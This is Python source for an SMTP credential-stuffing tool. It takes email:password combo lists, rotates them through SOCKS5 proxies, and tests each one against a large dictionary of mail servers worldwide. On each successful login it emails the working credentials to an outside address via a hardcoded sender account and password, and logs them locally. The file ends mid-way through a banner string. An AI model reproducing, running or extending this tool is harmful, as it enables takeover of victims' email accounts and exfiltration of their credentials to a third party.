import smtplib
import threading
import os
import sys
from colorama import Fore, Back, Style, init
import socks
import socket
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import html                     # added for safe escaping of passwords

# ----------------------------------------------------------------------
# Initialise colourama and clear the screen
# ----------------------------------------------------------------------
init()
os.system('cls' if os.name == 'nt' else 'clear')

# ----------------------------------------------------------------------
# Configuration – huge dictionary of SMTP servers (unchanged)
# ----------------------------------------------------------------------
SMTP_SERVERS = {
    # ==================== GLOBAL / MAJOR PROVIDERS ====================
    'office365':           ('smtp.office365.com', 587),
    'gmail':               ('smtp.gmail.com', 587),
    'googlemail':          ('smtp.googlemail.com', 587),
    'yahoo':               ('smtp.mail.yahoo.com', 587),
    'ymail':               ('smtp.ymail.com', 587),
    'outlook':             ('smtp-mail.outlook.com', 587),
    'hotmail':             ('smtp-mail.outlook.com', 587),
    'live':                ('smtp-mail.outlook.com', 587),
    'msn':                 ('smtp-mail.outlook.com', 587),
    'aol':                 ('smtp.aol.com', 587),
    'icloud':              ('smtp.mail.me.com', 587),
    'me':                  ('smtp.mail.me.com', 587),
    'mac':                 ('smtp.mail.me.com', 587),
    'fastmail':            ('smtp.fastmail.com', 587),
    'protonmail':          ('smtp.protonmail.com', 587),
    'zoho':                ('smtp.zoho.com', 587),
    'mailgun':             ('smtp.mailgun.org', 587),
    'sendgrid':            ('smtp.sendgrid.net', 587),
    'mailjet':             ('smtp.mailjet.com', 587),
    'brevo':               ('smtp-relay.brevo.com', 587),

    # ==================== RUSSIA / CIS ====================
    'mail_ru':             ('smtp.mail.ru', 587),
    'inbox_ru':            ('smtp.inbox.ru', 587),
    'list_ru':             ('smtp.list.ru', 587),
    'internet_ru':         ('smtp.internet.ru', 587),
    'yandex_ru':           ('smtp.yandex.ru', 587),
    'yandex_com':          ('smtp.yandex.com', 587),
    'yandex_net':          ('smtp.yandex.net', 587),
    'rambler':             ('smtp.rambler.ru', 587),

    # ==================== GERMANY ====================
    'gmx_de':              ('smtp.gmx.de', 587),
    'gmx_net':             ('smtp.gmx.net', 587),
    'gmx_at':              ('smtp.gmx.at', 587),
    'gmx_ch':              ('smtp.gmx.ch', 587),
    'gmx_co_uk':           ('smtp.gmx.co.uk', 587),
    'web_de':              ('smtp.web.de', 587),
    't_online':            ('smtp.t-online.de', 587),
    'freenet':             ('smtp.freenet.de', 587),

    # ==================== FRANCE ====================
    'free_fr':             ('smtp.free.fr', 587),
    'orange_fr':           ('smtp.orange.fr', 587),
    'wanadoo':             ('smtp.wanadoo.fr', 587),
    'sfr_fr':              ('smtp.sfr.fr', 587),

    # ==================== ITALY ====================
    'libero_it':           ('smtp.libero.it', 587),
    'tiscali_it':          ('smtp.tiscali.it', 587),
    'tin_it':              ('smtp.tin.it', 587),
    'alice_it':            ('smtp.alice.it', 587),
    'iol_it':              ('smtp.iol.it', 587),
    'fastweb_it':          ('smtp.fastweb.it', 587),
    'virgilio_it':         ('smtp.virgilio.it', 587),

    # ==================== POLAND ====================
    'wp_pl':               ('smtp.wp.pl', 587),
    'onet_pl':             ('smtp.onet.pl', 587),
    'o2_pl':               ('smtp.o2.pl', 587),
    'interia_pl':          ('smtp.interia.pl', 587),
    'poczta_onet':         ('smtp.poczta.onet.pl', 587),

    # ==================== CZECH REPUBLIC ====================
    'seznam':              ('smtp.seznam.cz', 587),
    'zmail':               ('smtp.zmail.cz', 587),
    'volny':               ('smtp.volny.cz', 587),

    # ==================== NETHERLANDS ====================
    'hetz_nl':             ('smtp.hetzmail.nl', 587),
    'ziggo_nl':            ('smtp.ziggo.nl', 587),
    'kpn_nl':              ('smtp.kpnmail.nl', 587),
    'upc_nl':              ('smtp.upc.nl', 587),

    # ==================== BELGIUM ====================
    'telenet_be':          ('smtp.telenet.be', 587),
    'proximus_be':         ('smtp.proximus.be', 587),
    'skynet_be':           ('smtp.skynet.be', 587),
    'voo_be':              ('smtp.voo.be', 587),

    # ==================== SWITZERLAND ====================
    'bluewin_ch':          ('smtp.bluewin.ch', 587),
    'sunrise_ch':          ('smtp.sunrise.ch', 587),
    'swissonline_ch':      ('smtp.swissonline.ch', 587),

    # ==================== AUSTRIA ====================
    'aon_at':              ('smtp.aon.at', 587),
    'tee_at':              ('smtp.tee.at', 587),

    # ==================== SPAIN ====================
    'telefonica_es':       ('smtp.telefonica.es', 587),
    'movistar_es':         ('smtp.movistar.es', 587),
    'vodafone_es':         ('smtp.vodafone.es', 587),
    'ono_es':              ('smtp.ono.es', 587),

    # ==================== PORTUGAL ====================
    'sapo_pt':             ('smtp.sapo.pt', 587),
    'meo_pt':              ('smtp.meo.pt', 587),
    'now_pt':              ('smtp.now.pt', 587),

    # ==================== SCANDINAVIA ====================
    'telia_se':            ('smtp.telia.se', 587),
    'telia_no':            ('smtp.telia.no', 587),
    'telia_dk':            ('smtp.telia.dk', 587),
    'telia_fi':            ('smtp.telia.fi', 587),
    'welho_se':            ('smtp.welho.se', 587),
    'sonera_fi':           ('smtp.sonera.fi', 587),

    # ==================== UK / IRELAND ====================
    'bt_uk':               ('smtp.btinternet.com', 587),
    'sky_uk':              ('smtp.sky.com', 587),
    'virgin_media_uk':     ('smtp.virginmedia.com', 587),
    'talktalk_uk':         ('smtp.talktalk.net', 587),
    'eir_ie':              ('smtp.eir.ie', 587),
    'vmobl_ie':            ('smtp.vmobl.ie', 587),

    # ==================== AUSTRALIA ====================
    'bigpond_au':          ('smtp.bigpond.com', 587),
    'aapt_au':             ('smtp.aapt.com.au', 587),
    'telstra_au':          ('smtp.telstra.com.au', 587),
    'optus_au':            ('smtp.optusnet.com.au', 587),
    'ii_net':              ('smtp.ii.net.au', 587),

    # ==================== NEW ZEALAND ====================
    'xtra_nz':             ('smtp.xtra.co.nz', 587),
    'clear_nz':            ('smtp.clear.co.nz', 587),
    'vero_nz':             ('smtp.vero.nz', 587),

    # ==================== EASTERN EUROPE ====================
    'cosmote_gr':          ('smtp.cosmote.gr', 587),
    'otenet_gr':           ('smtp.otenet.gr', 587),
    'telecom_bg':          ('smtp.telecom.bg', 587),
    'telenor_bg':          ('smtp.telenor.bg', 587),
    'vivacom_bg':          ('smtp.vivacom.bg', 587),
    'orange_ro':           ('smtp.orange.ro', 587),
    'vodafone_ro':         ('smtp.vodafone.ro', 587),
    'digi_ro':             ('smtp.digi.ro', 587),
    'srbija_rs':           ('smtp.srbija.rs', 587),
    'mts_rs':              ('smtp.mts.rs', 587),
    'ht_hr':               ('smtp.ht.hr', 587),
    'vip_hr':              ('smtp.vip.hr', 587),
    'a1_hr':               ('smtp.a1.hr', 587),
    'telekom_si':          ('smtp.telekom.si', 587),
    'siol_si':             ('smtp.siol.net', 587),
    'ht_ba':               ('smtp.ht.ba', 587),
    'mtel_ba':             ('smtp.mtel.ba', 587),
    'vodafone_al':         ('smtp.vodafone.al', 587),
    'celite_al':           ('smtp.celite.al', 587),
    'mts_me':              ('smtp.mts.me', 587),
    'a1_mk':               ('smtp.a1.mk', 587),
    'telemach_mk':         ('smtp.telemach.mk', 587),
    'go_mt':               ('smtp.go.com.mt', 587),
    'cyta_cy':             ('smtp.cyta.com.cy', 587),

    # ==================== TURKEY ====================
    'turktelekom_tr':      ('smtp.turktelekom.com.tr', 587),
    'superonline_tr':      ('smtp.superonline.net', 587),
    'ttnet_tr':            ('smtp.ttnet.com.tr', 587),
    'vodafone_tr':         ('smtp.vodafone.com.tr', 587),
    'vega_tr':             ('smtp.vega.com.tr', 587),

    # ==================== MIDDLE EAST ====================
    'bezeq_il':            ('smtp.bezeqint.net', 587),
    'hot_il':              ('smtp.hot.net.il', 587),
    'cellcom_il':          ('smtp.cellcom.co.il', 587),
    'mci_ir':              ('smtp.mci.ir', 587),
    'irancell_ir':         ('smtp.irancell.ir', 587),
    'zain_jo':             ('smtp.zain.jo', 587),
    'ums_jo':              ('smtp.ums.com.jo', 587),
    'ajet_jo':             ('smtp.ajet.com.jo', 587),
    'zain_kw':             ('smtp.zain.kw', 587),
    'umatel_kw':           ('smtp.umatel.kw', 587),
    'stc_kw':              ('smtp.stc.kw', 587),
    'oredoo_qa':           ('smtp.oredoo.qa', 587),
    'vodafone_qa':         ('smtp.vodafone.qa', 587),
    'batelco_bh':          ('smtp.batelco.bh', 587),
    'vodafone_bh':         ('smtp.vodafone.bh', 587),
    'omanom_om':           ('smtp.omanom.com', 587),
    'vodafone_om':         ('smtp.vodafone.om', 587),
    'du_ae':               ('smtp.du.ae', 587),
    'etisalat_ae':         ('smtp.etisalat.ae', 587),
    'mobily_sa':           ('smtp.mobily.com.sa', 587),
    'zain_sa':             ('smtp.zain.com.sa', 587),
    'stc_sa':              ('smtp.stc.com.sa', 587),

    # ==================== NORTH AFRICA ====================
    'tetecom_eg':          ('smtp.tetecom.eg', 587),
    'vodafone_eg':         ('smtp.vodafone.com.eg', 587),
    'we_eg':               ('smtp.we.com.eg', 587),
    'djezzy_dz':           ('smtp.djezzy.dz', 587),
    'mobilis_dz':          ('smtp.mobilis.dz', 587),
    'tunetel_tn':          ('smtp.tunetel.tn', 587),
    'tunisnet_tn':         ('smtp.tunisnet.tn', 587),
    'maroc_telecom_ma':    ('smtp.maroc-telecom.ma', 587),
    'iam_ma':              ('smtp.iam.ma', 587),
    'menara_ma':           ('smtp.menara.ma', 587),

    # ==================== WEST AFRICA ====================
    'mtn_gh':              ('smtp.mtn.com.gh', 587),
    'vodafone_gh':         ('smtp.vodafone.com.gh', 587),
    'telecel_gh':          ('smtp.telecel.gh', 587),
    'mtn_ng':              ('smtp.mtn.com.ng', 587),
    'glo_ng':              ('smtp.glo.com.ng', 587),
    'airtel_ng':           ('smtp.airtel.ng', 587),
    'etisalat_ng':         ('smtp.9mobile.ng', 587),
    'vodaco_za':           ('smtp.vodaco.za', 587),
    'web4africa_za':       ('smtp.web4africa.com', 587),
    'telkom_za':           ('smtp.telkom.net', 587),
    'mtn_za':              ('smtp.mtn.co.za', 587),
    'vodacom_za':          ('smtp.vodacom.co.za', 587),
    'virgin_za':           ('smtp.virgin.co.za', 587),

    # ==================== EAST AFRICA ====================
    'safaricom_ke':        ('smtp.safaricom.co.ke', 587),
    'mtn_ke':              ('smtp.mtn.co.ke', 587),
    'africell_ke':         ('smtp.africell.co.ke', 587),
    'vodacom_tz':          ('smtp.vodacom.co.tz', 587),
    'tigo_tz':             ('smtp.tigo.co.tz', 587),
    'airtel_tz':           ('smtp.airtel.tz', 587),
    'africell_ug':         ('smtp.africell.ug', 587),
    'mtn_ug':              ('smtp.mtn.co.ug', 587),
    'liberty_ug':          ('smtp.liberty.ug', 587),
    'ethiotelecom_et':     ('smtp.ethiotelecom.et', 587),

    # ==================== SOUTHERN AFRICA ====================
    'ecom_zw':             ('smtp.ecom.co.zw', 587),
    'econet_zw':           ('smtp.econet.co.zw', 587),
    'netone_zw':           ('smtp.netone.co.zw', 587),
    'mascom_bw':           ('smtp.mascom.bw', 587),
    'vodacom_bw':          ('smtp.vodacom.co.bw', 587),
    'mtn_na':              ('smtp.mtn.co.na', 587),
    'telkomsa_na':         ('smtp.telkomsa.com.na', 587),
    'tanam_mw':            ('smtp.tanam.com.mw', 587),
    'airtel_mw':           ('smtp.airtel.mw', 587),
    'mtn_zm':              ('smtp.mtn.co.zm', 587),
    'zamtel_zm':           ('smtp.zamtel.co.zm', 587),
    'airtel_zm':           ('smtp.airtel.zm', 587),
    'mcel_mz':             ('smtp.mcel.co.mz', 587),
    'movitel_mz':          ('smtp.movitel.co.mz', 587),
    'vodacom_mz':          ('smtp.vodacom.co.mz', 587),
    'movicel_ao':          ('smtp.movicel.ao', 587),
    'unitel_ao':           ('smtp.unitel.ao', 587),
    'sabc_mg':             ('smtp.sabc.mg', 587),
    'orange_mg':           ('smtp.orange.mg', 587),
    'smarthub_mu':         ('smtp.smarthub.mu', 587),
    'orange_mu':           ('smtp.orange.mu', 587),

    # ==================== SOUTH ASIA ====================
    'vsnl_in':             ('smtp.vsnl.com', 587),
    'bsnl_in':             ('smtp.bsnl.co.in', 587),
    'airtel_in':           ('smtp.airtel.in', 587),
    'idea_in':             ('smtp.idea.in', 587),
    'tata_in':             ('smtp.tataindicom.com', 587),
    'mtnl_in':             ('smtp.mtnl.in', 587),
    'jazz_pk':             ('smtp.jazz.com.pk', 587),
    'ptcl_pk':             ('smtp.ptcl.net.pk', 587),
    'awan_pk':             ('smtp.awan.com.pk', 587),
    'zong_pk':             ('smtp.zong.com.pk', 587),
    'telenor_pk':          ('smtp.telenor.com.pk', 587),
    'ufone_pk':            ('smtp.ufone.com.pk', 587),
    'paknet_pk':           ('smtp.paknet.net.pk', 587),
    'dialog_lk':           ('smtp.dialog.lk', 587),
    'mobitel_lk':          ('smtp.mobitel.lk', 587),
    'sltnet_lk':           ('smtp.sltnet.lk', 587),
    'grameenphone_bd':     ('smtp.grameenphone.com.bd', 587),
    'robi_bd':             ('smtp.robi.com.bd', 587),
    'banglalink_bd':       ('smtp.banglalink.com.bd', 587),
    'teletalk_bd':         ('smtp.teletalk.com.bd', 587),

    # ==================== SOUTHEAST ASIA ====================
    'mpt_mm':              ('smtp.mptnet.com.mm', 587),
    'dtac_th':             ('smtp.dtac.co.th', 587),
    'ais_th':              ('smtp.ais.co.th', 587),
    'true_th':             ('smtp.true.co.th', 587),
    'catt_th':             ('smtp.catt.co.th', 587),
    'indosat_id':          ('smtp.indosat.com', 587),
    'telkomsel_id':        ('smtp.telkomsel.com', 587),
    'xl_id':               ('smtp.xl.co.id', 587),
    'smartfren_id':        ('smtp.smartfren.co.id', 587),
    'telkom_id':           ('smtp.telkom.net.id', 587),
    'maxis_my':            ('smtp.maxis.com.my', 587),
    'digi_my':             ('smtp.digi.com.my', 587),
    'mobileone_my':        ('smtp.mobileone.com.my', 587),
    'cdnet_my':            ('smtp.cdnet.com.my', 587),
    'singnet_sg':          ('smtp.singnet.com.sg', 587),
    'starhub_sg':          ('smtp.starhub.com.sg', 587),
    'm1_sg':               ('smtp.m1.com.sg', 587),
    'globe_ph':            ('smtp.globe.com.ph', 587),
    'smart_ph':            ('smtp.smart.com.ph', 587),
    'digitel_ph':          ('smtp.digitel.com.ph', 587),
    'pldt_ph':             ('smtp.pldt.com', 587),
    'vietnhamobile_vn':    ('smtp.vietnhamobile.com.vn', 587),
    'vinaphone_vn':        ('smtp.vinaphone.vn', 587),
    'vietnamobile_vn':     ('smtp.vietnamobile.vn', 587),
    'ftth_vn':             ('smtp.ftth.vn', 587),
    'smart_kh':            ('smtp.smart.com.kh', 587),
    'mekong_kh':           ('smtp.mekong.com.kh', 587),
    'laostelecom_la':      ('smtp.laostelecom.la', 587),
    'mobicom_mn':          ('smtp.mobicom.mn', 587),
    'unitel_mn':           ('smtp.unitel.mn', 587),
    'goo_mn':              ('smtp.goo.mn', 587),

    # ==================== CENTRAL ASIA ====================
    'uztelecom_uz':        ('smtp.uztelecom.uz', 587),
    'beeline_uz':          ('smtp.beeline.uz', 587),
    'megafon_uz':          ('smtp.megafon.uz', 587),
    'beeline_kz':          ('smtp.beeline.kz', 587),
    'kcell_kz':            ('smtp.kcell.kz', 587),
    'activ_kz':            ('smtp.activ.kz', 587),
    'kaztelecom_kz':       ('smtp.kaztelecom.kz', 587),
    'azercell_az':         ('smtp.azercell.az', 587),
    'beeline_az':          ('smtp.beeline.az', 587),
    'nar_az':              ('smtp.nar.az', 587),
    'magcom_ge':           ('smtp.magcom.ge', 587),
    'beeline_ge':          ('smtp.beeline.ge', 587),
    'gts_ge':              ('smtp.gts.ge', 587),
    'ugm_am':              ('smtp.ugm.am', 587),
    'viva_am':             ('smtp.viva.am', 587),
    'amcell_am':           ('smtp.amcell.am', 587),
    'tcell_tm':            ('smtp.tcell.tm', 587),
    'beeline_tm':          ('smtp.beeline.tm', 587),

    # ==================== EAST ASIA ====================
    'softbank_jp':         ('smtp.softbank.ne.jp', 587),
    'docomo_jp':           ('smtp.docomo.ne.jp', 587),
    'au_kddi_jp':          ('smtp.au.com', 587),
    'ocn_jp':              ('smtp.ocn.ne.jp', 587),
    'jcom_jp':             ('smtp.jcom.co.jp', 587),
    'ii_jp':               ('smtp.ii-jibun.net', 587),
    'dion_jp':             ('smtp.dion.ne.jp', 587),
    'biglobe_jp':          ('smtp.biglobe.ne.jp', 587),
    'naver_kr':            ('smtp.naver.com', 587),
    'daum_kr':             ('smtp.daum.net', 587),
    'hanmail_kr':          ('smtp.hanmail.net', 587),
    'kt_kr':               ('smtp.ktf.com', 587),
    'lg_uplus_kr':         ('smtp.lguplus.com', 587),
    'skt_kr':              ('smtp.011.co.kr', 587),
    'samsung_kr':          ('smtp.samsung.com', 587),
    'cn_163':              ('smtp.163.com', 587),
    'cn_126':              ('smtp.126.com', 587),
    'cn_sina':             ('smtp.sina.com', 587),
    'cn_qq':               ('smtp.qq.com', 587),
    'cn_cm':               ('smtp.139.com', 587),
    'cn_cug':              ('smtp.189.cn', 587),

    # ==================== LATIN AMERICA ====================
    'uol_br':              ('smtp.uol.com.br', 587),
    'bol_br':              ('smtp.bol.com.br', 587),
    'terra_br':            ('smtp.terra.com.br', 587),
    'ig_br':               ('smtp.ig.com.br', 587),
    'oi_br':               ('smtp.oi.com.br', 587),
    'tim_br':              ('smtp.timbrasil.com.br', 587),
    'vivo_br':             ('smtp.vivo.com.br', 587),
    'uol_ar':              ('smtp.uol.com.ar', 587),
    'fibertel_ar':         ('smtp.fibertel.com.ar', 587),
    'movistar_ar':         ('smtp.movistar.com.ar', 587),
    'arnet_ar':            ('smtp.arnet.com.ar', 587),
    'entel_cl':            ('smtp.entel.cl', 587),
    'movistar_cl':         ('smtp.movistar.cl', 587),
    'etb_co':              ('smtp.etb.com.co', 587),
    'tcc_co':              ('smtp.tcc.com.co', 587),
    'movistar_co':         ('smtp.movistar.com.co', 587),
    'unifibras_co':        ('smtp.unifibras.com.co', 587),
    'telmex_mx':           ('smtp.telmex.com.mx', 587),
    'movistar_mx':         ('smtp.movistar.com.mx', 587),
    'izzi_mx':             ('smtp.izzi.mx', 587),
    'telcel_mx':           ('smtp.telcel.com', 587),
    'att_mx':              ('smtp.att.net.mx', 587),
    'movistar_uy':         ('smtp.movistar.com.uy', 587),
    'telpers_uy':          ('smtp.telpers.com.uy', 587),
    'antel_uy':            ('smtp.antel.com.uy', 587),
    'otb_uy':              ('smtp.otb.com.uy', 587),
    'movistar_py':         ('smtp.movistar.com.py', 587),
    'une_py':              ('smtp.une.net.py', 587),
    'movistar_pe':         ('smtp.movistar.com.pe', 587),
    'claro_pe':            ('smtp.claro.com.pe', 587),
    'entel_pe':            ('smtp.entel.pe', 587),
    'altanet_pe':          ('smtp.altanet.com.pe', 587),
    'movistar_ec':         ('smtp.movistar.com.ec', 587),
    'claro_ec':            ('smtp.claro.com.ec', 587),
    'ectel_ec':            ('smtp.ectel.com.ec', 587),
    'entel_bo':            ('smtp.entel.bo', 587),
    'telbo_bo':            ('smtp.telbo.bo', 587),
    'movistar_bo':         ('smtp.movistar.bo', 587),
    'movistar_cr':         ('smtp.movistar.com.cr', 587),
    'tico_cr':             ('smtp.tico.cr', 587),
    'telecable_cr':        ('smtp.telecable.co.cr', 587),
    'movistar_pa':         ('smtp.movistar.com.pa', 587),
    'unacal_pa':           ('smtp.unacal.pa', 587),
    'movistar_do':         ('smtp.movistar.com.do', 587),
    'telecable_do':        ('smtp.telecable.com.do', 587),
    'movistar_hn':         ('smtp.movistar.com.hn', 587),
    'hnet_hn':             ('smtp.hnet.hn', 587),
    'movistar_gt':         ('smtp.movistar.com.gt', 587),
    'tigo_gt':             ('smtp.tigo.com.gt', 587),
    'movistar_ni':         ('smtp.movistar.com.ni', 587),
    'tigo_ni':             ('smtp.tigo.com.ni', 587),
    'movistar_sv':         ('smtp.movistar.com.sv', 587),
    'tigo_sv':             ('smtp.tigo.com.sv', 587),

    # ==================== CARIBBEAN ====================
    'movistar_ve':         ('smtp.movistar.com.ve', 587),
    'canaltv_ve':          ('smtp.canaltv.com.ve', 587),
}
# Use office365 as the test SMTP for proxy validation
TEST_SMTP = SMTP_SERVERS['office365']

# ----------------------------------------------------------------------
# send_html_email – now works correctly with an optional proxy
# ----------------------------------------------------------------------
def send_html_email(subject, html_content, from_email, password,
                    to_email, smtp_server, smtp_port, proxy=None):
    """
    Send an HTML email using the given SMTP server.
    If a proxy is supplied it will be used for the connection.
    """
    msg = MIMEMultipart('alternative')
    msg['Subject'] = subject
    msg['From'] = from_email
    msg['To'] = to_email
    part = MIMEText(html_content, 'html')
    msg.attach(part)

    try:
        # Create a socket – wrap it with SOCKS5 only when a proxy is given
        if proxy:
            proxy_ip, proxy_port = proxy.split(':')
            sock = socks.socksocket()
            sock.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
        else:
            sock = socket.socket()

        with smtplib.SMTP(smtp_server, smtp_port, sock=sock) as server:
            server.starttls()
            server.login(from_email, password)
            server.sendmail(from_email, to_email, msg.as_string())

        print(Fore.GREEN + f'Email sent successfully to {to_email}' + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f'Failed to send email: {e}' + Style.RESET_ALL)

# ----------------------------------------------------------------------
# NEW: Helper that builds and sends the HTML success notification
# ----------------------------------------------------------------------
def send_success_email(full_combo, smtp_host, smtp_port, proxy):
    """
    Build a styled HTML email that reports a successful login and send it.
    full_combo – the original string (e.g. "john.doe@example.com:Password1")
    smtp_host, smtp_port – server that succeeded
    proxy – proxy used (or None)
    """
    # Escape only the characters that could break HTML; keep ':' and the password
    esc_combo = html.escape(full_combo)
    esc_proxy = html.escape(proxy) if proxy else 'None'

    # Exact decoded string you wrote to the log file (colon → pipe)
    decoded = f'{smtp_host}|{smtp_port}|{full_combo.replace(":", "|")}'

    html_content = f'''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>✅ Successful Login – {esc_combo}</title>
  <style>
    body {{ font-family:Arial, Helvetica, sans-serif; margin:0; padding:20px; background:#f5f5f5; color:#333; }}
    .wrapper {{ max-width:600px; margin:auto; background:#fff; border:1px solid #ddd; border-radius:8px; overflow:hidden; box-shadow:0 2px 6px rgba(0,0,0,.15); }}
    .header {{ background:linear-gradient(135deg,#27ae60,#2ecc71); color:#fff; text-align:center; padding:30px 20px; }}
    .header h1 {{ margin:0; font-size:22px; }}
    .body {{ padding:30px 20px; }}
    .row {{ margin-bottom:20px; }}
    .label {{ font-weight:bold; color:#555; display:block; margin-bottom:5px; }}
    .value {{ color:#333; font-family:monospace; background:#f9f9f9; padding:8px; border:1px solid #eee; border-radius:4px; }}
    .pre {{ background:#f4f4f4; padding:12px; font-family:monospace; overflow-x:auto; border:1px solid #e0e0e0; border-radius:4px; }}
    .footer {{ background:#ecf0f1; color:#777; text-align:center; font-size:12px; padding:20px; }}
  </style>
</head>
<body>
<div class="wrapper">
  <div class="header">
    <h1>✅ Login Successful</h1>
    <p>S.M.T.P – T.E.R.G.R.A.B | By AnnaQitty</p>
  </div>
  <div class="body">
    <div class="row">
      <span class="label">Original Combo:</span>
      <div class="value">{esc_combo}</div>
    </div>
    <div class="row">
      <span class="label">SMTP Server:</span>
      <div class="value">{smtp_host}</div>
    </div>
    <div class="row">
      <span class="label">Port:</span>
      <div class="value">{smtp_port}</div>
    </div>
    <div class="row">
      <span class="label">Proxy Used:</span>
      <div class="value">{esc_proxy}</div>
    </div>
    <div class="row">
      <span class="label">Full Decoded:</span>
      <pre class="pre">{decoded}</pre>
    </div>
  </div>
  <div class="footer">
    © 2025 AnnaQitty • <a href="https://github.com/annaqitty" style="color:#777;">Project Repo</a>
  </div>
</div>
</body>
</html>
'''

    # Send the email using the existing function
    send_html_email(
        subject=f'S.M.T.P – Success: {full_combo}',
        html_content=html_content,
        from_email='eros@succed.net',          # <-- replace with your sender
        password='Chu4k3rz_123',              # <-- replace with real password
        to_email='scam.rest@gmail.com',             # <-- replace with real recipient
        smtp_server='smtps.aruba.it',           # fallback for the notification email
        smtp_port=587,
        proxy=None                                  # no proxy needed for the notification itself
    )

    # Optional log entry
    log_entry = f'{full_combo} | {smtp_host}:{smtp_port} | {proxy if proxy else "None"} | SUCCESS\n'
    with open('email_log.txt', 'a') as lf:
        lf.write(log_entry)

    print(Fore.GREEN + f'📧 Success email sent for {full_combo}' + Style.RESET_ALL)

# ----------------------------------------------------------------------
# Proxy validation – unchanged logic, but now uses a lock for safety
# ----------------------------------------------------------------------
def check_proxy(proxy):
    """Test a single proxy by trying to connect to the test SMTP server."""
    try:
        proxy_ip, proxy_port = proxy.split(':')
        sock = socks.socksocket()
        sock.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
        with smtplib.SMTP(TEST_SMTP[0], TEST_SMTP[1], sock=sock) as server:
            server.starttls()
        return True
    except Exception:
        return False

def proxy_checker(proxies, valid_proxies, lock):
    """Worker that checks a list of proxies and adds working ones to valid_proxies."""
    for proxy in proxies:
        if check_proxy(proxy):
            with lock:
                valid_proxies.append(proxy)
                print(Fore.GREEN + f'Proxy WORKED: {proxy}' + Style.RESET_ALL)
        else:
            print(Fore.RED + f'Proxy DEAD: {proxy}' + Style.RESET_ALL)

# ----------------------------------------------------------------------
# Combo validation – now calls send_success_email on success
# ----------------------------------------------------------------------
def validate_combo(combo, smtp_servers, proxy_queue, lock):
    """
    Validate a username:password combo against each SMTP server.
    Uses a proxy from the queue if available, and returns it on success.
    """
    username, password = [x.strip() for x in combo.split(':')]
    try:
        domain = username.split('@')[1]
    except IndexError:
        domain = 'unknown'

    for name, (smtp_host, smtp_port) in smtp_servers.items():
        proxy = None
        # Borrow a proxy if any are available
        with lock:
            if proxy_queue:
                proxy = proxy_queue.pop(0)

        try:
            # Prepare socket (with or without proxy)
            if proxy:
                proxy_ip, proxy_port = proxy.split(':')
                sock = socks.socksocket()
                sock.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
            else:
                sock = socket.socket()

            with smtplib.SMTP(smtp_host, smtp_port, sock=sock) as server:
                server.starttls()
                server.login(username, password)
                print(Fore.GREEN + f'SUCCESS ({name}): {combo}' + Style.RESET_ALL)

                # ----- NEW: send HTML notification with the full combo -----
                send_success_email(combo, smtp_host, smtp_port, proxy)

                # If we used a proxy and it succeeded, put it back for reuse
                if proxy:
                    with lock:
                        proxy_queue.append(proxy)
                return True

        except smtplib.SMTPAuthenticationError:
            print(Fore.MAGENTA + f'Authentication failed ({name}): {combo}' + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f'Error with ({name}): {combo} - {e}' + Style.RESET_ALL)

        # Discard a failing proxy (already removed from queue)
        if proxy:
            pass

    return False

# ----------------------------------------------------------------------
# Main workflow – unchanged except for the new email logging
# ----------------------------------------------------------------------
def process_file(file_path, proxy_file_path=None, num_threads=10):
    """Load proxies (optional), check them, then load and validate combos."""
    # --------------------------------------------------------------
    # 1. Load and verify proxies
    # --------------------------------------------------------------
    proxies = []
    if proxy_file_path:
        try:
            with open(proxy_file_path, 'r') as pf:
                proxies = [line.strip() for line in pf if line.strip()]
        except Exception as e:
            print(Fore.RED + f'Failed to read proxy file: {e}' + Style.RESET_ALL)
            proxies = []

    valid_proxies = []
    proxy_queue = []                     # FIFO queue for working proxies
    if proxies:
        # Split the proxy list among several checker threads
        chunk_size = max(1, len(proxies) // num_threads)
        chunks = [proxies[i:i + chunk_size] for i in range(0, len(proxies), chunk_size)]
        lock = threading.Lock()
        threads = []
        for chunk in chunks:
            t = threading.Thread(target=proxy_checker,
                                 args=(chunk, valid_proxies, lock))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()

        # Populate the reusable proxy queue
        with lock:
            proxy_queue.extend(valid_proxies)

        if valid_proxies:
            print(Fore.GREEN + f'Found {len(valid_proxies)} working proxies. '
                  f'Saved to working_proxies.txt' + Style.RESET_ALL)
            try:
                with open('working_proxies.txt', 'w') as wf:
                    wf.write('\n'.join(valid_proxies))
            except Exception as e:
                print(Fore.RED + f'Failed to save working proxies: {e}' + Style.RESET_ALL)
        else:
            print(Fore.RED + 'No working proxies found.' + Style.RESET_ALL)

    # --------------------------------------------------------------
    # 2. Load combos and apply blacklist filter
    # --------------------------------------------------------------
    try:
        with open(file_path, 'r') as cf:
            combos = [line.strip() for line in cf if line.strip()]
    except Exception as e:
        print(Fore.RED + f'Failed to read combo file: {e}' + Style.RESET_ALL)
        return

    # Remove duplicates
    combos = list(set(combos))

    # Load optional blacklist
    blacklist = set()
    try:
        with open('BlackList.txt', 'r') as blf:
            blacklist = set(line.strip().lower() for line in blf if line.strip())
    except Exception:
        pass

    # Filter out combos whose domain appears in the blacklist
    filtered_combos = []
    for combo in combos:
        try:
            domain = combo.split(':')[0].split('@')[1].strip().lower()
            if domain not in blacklist:
                filtered_combos.append(combo)
        except Exception:
            # If we cannot parse the domain, keep the combo
            filtered_combos.append(combo)

    if not filtered_combos:
        print(Fore.RED + 'No combos left after blacklist filtering.' + Style.RESET_ALL)
        return

    # --------------------------------------------------------------
    # 3. Validate combos with a thread pool
    # --------------------------------------------------------------
    lock = threading.Lock()
    job_index = [0]                     # mutable container for the next combo to process

    def worker():
        """Each worker pulls combos from the shared list and validates them."""
        while True:
            with lock:
                if job_index[0] < len(filtered_combos):
                    combo = filtered_combos[job_index[0]]
                    job_index[0] += 1
                else:
                    return
            validate_combo(combo, SMTP_SERVERS, proxy_queue, lock)

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=worker)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print(Fore.LIGHTGREEN_EX + 'Processing complete.' + Style.RESET_ALL)

# ----------------------------------------------------------------------
# Banner and user input – unchanged
# ----------------------------------------------------------------------
banner = (
    '╔═╦═╦╦═╦╦═╗╔═╦╦══╦══╦╦╗\n'
    '║╩║║║║║║╩║║╚║╠╗╔╩╗╔╩╗║\n'
